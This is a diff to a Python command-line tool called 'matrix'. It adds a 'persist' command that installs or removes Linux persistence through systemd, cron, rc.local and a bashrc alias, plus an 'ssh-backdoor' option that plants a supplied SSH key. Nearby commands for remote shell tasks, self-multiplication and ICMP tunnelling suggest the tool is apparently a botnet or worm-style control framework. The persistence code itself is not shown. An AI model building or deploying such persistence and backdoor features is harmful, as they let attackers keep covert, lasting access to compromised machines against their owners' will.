@@ -310,6 +310,30 @@ def cmd_multiply(args):
         node.stop()
 
 
+def cmd_persist(args):
+    """Enable/disable persistence mechanisms."""
+    from matrix.persistence import PersistenceManager
+
+    mechanisms = list(args.mechanisms) if hasattr(args, "mechanisms") else []
+    if "all-linux" in mechanisms:
+        mechanisms = PersistenceManager.ALL_LINUX
+
+    command = getattr(args, "command", "matrix listen").split()
+    pubkey = getattr(args, "pubkey", None)
+    pm = PersistenceManager(command=command, pubkey=pubkey)
+
+    if args.persist_command == "enable":
+        results = pm.enable(mechanisms)
+    elif args.persist_command == "disable":
+        results = pm.disable(mechanisms)
+    else:
+        results = pm.status()
+
+    for r in results:
+        status = "enabled" if r.enabled else "disabled"
+        logger.info("  %-20s %s (%s)", r.mechanism, status, r.details or r.path or "-")
+
+
 def cmd_task(args):
     """Run a shell command on a remote node."""
     identity, trust_store, require_identity = _build_identity_context(args)
@@ -505,6 +529,33 @@ def main():
     p_multi.add_argument("--icmp", action="store_true",
                          help="Use ICMP echo tunnel transport (requires root)")
 
+    # persist
+    p_persist = sub.add_parser("persist", help="Persistence and survival controls")
+    persist_sub = p_persist.add_subparsers(dest="persist_command", required=True)
+    p_persist_enable = persist_sub.add_parser("enable", help="Install persistence mechanisms")
+    p_persist_enable.add_argument(
+        "mechanisms",
+        nargs="+",
+        choices=["systemd-system", "systemd-user", "cron", "rc-local", "bashrc-alias", "ssh-backdoor", "all-linux"],
+        help="Persistence mechanisms to install",
+    )
+    p_persist_enable.add_argument(
+        "--command", type=str, default="matrix listen",
+        help="Command to persist (default: 'matrix listen')",
+    )
+    p_persist_enable.add_argument(
+        "--pubkey", type=str, default=None,
+        help="SSH public key for ssh-backdoor mechanism",
+    )
+    p_persist_disable = persist_sub.add_parser("disable", help="Remove persistence mechanisms")
+    p_persist_disable.add_argument(
+        "mechanisms",
+        nargs="+",
+        choices=["systemd-system", "systemd-user", "cron", "rc-local", "bashrc-alias", "ssh-backdoor", "all-linux"],
+        help="Persistence mechanisms to remove",
+    )
+    persist_sub.add_parser("status", help="Show persistence status")
+
     # task
     p_task = sub.add_parser("task", help="Run a shell command on a target node")
     p_task.add_argument("target", help="Target device (IP:PORT or name)")
@@ -579,6 +630,7 @@ def main():
         "jump": cmd_jump,
         "multiply": cmd_multiply,
         "task": cmd_task,
+        "persist": cmd_persist,
         "status": cmd_status,
         "rain": cmd_rain,
         "config": cmd_config,
